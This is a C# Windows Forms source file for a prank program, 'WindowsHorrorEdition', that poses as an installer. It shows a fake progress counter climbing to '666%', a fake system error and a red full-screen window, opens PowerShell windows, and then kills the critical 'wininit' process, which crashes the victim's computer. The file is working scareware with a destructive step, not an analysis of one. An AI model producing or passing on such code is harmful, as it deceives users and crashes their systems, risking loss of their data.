﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsHorrorEdition
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private async void Form1_Load(object sender, EventArgs e)
        {
            pictureBox2.Visible = false;
            label3.Visible = false;
            this.FormBorderStyle = FormBorderStyle.None;
            this.TopMost = false;
            this.WindowState = FormWindowState.Maximized;
            await Task.Delay(1000);
            label1.Text = "30%";
            await Task.Delay(1000);
            label1.Text = "70%";
            await Task.Delay(1000);
            label1.Text = "99%";
            await Task.Delay(3000);
            label1.Text = "666%";
            await Task.Delay(1000);
            MessageBox.Show("Error Copy 666.sys", "666.exe", MessageBoxButtons.OK, MessageBoxIcon.Error);
            pictureBox2.Visible = true;
            label3.Visible = true;
            this.BackColor = Color.Red;
            this.Cursor = Cursors.WaitCursor;
            this.TopMost = false;
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = "ps";
            Process.Start(psi);
            await Task.Delay(12000);
            ProcessStartInfo psi2 = new ProcessStartInfo();
            psi2.FileName = "powershell.exe";
            psi2.Arguments = "ps";
            Process.Start(psi2);
            await Task.Delay(16000);
            Process.GetProcessesByName("wininit")[0].Kill();
        }

    }
}
